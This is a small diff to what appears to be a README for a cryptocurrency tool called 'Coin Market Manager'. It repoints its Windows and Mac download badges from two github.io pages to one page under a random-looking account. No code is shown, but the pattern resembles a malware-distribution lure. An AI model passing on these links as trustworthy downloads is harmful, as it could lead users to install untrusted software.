@@ -7,8 +7,8 @@
 
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://coin-market-manager-desktop.github.io/.github)  
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://shariatpatryl713.github.io/.github)
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://h74738709.github.io/.github/Coin-Market-Manager)  
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://h74738709.github.io/.github/Coin-Market-Manager)
 
 </div>
 
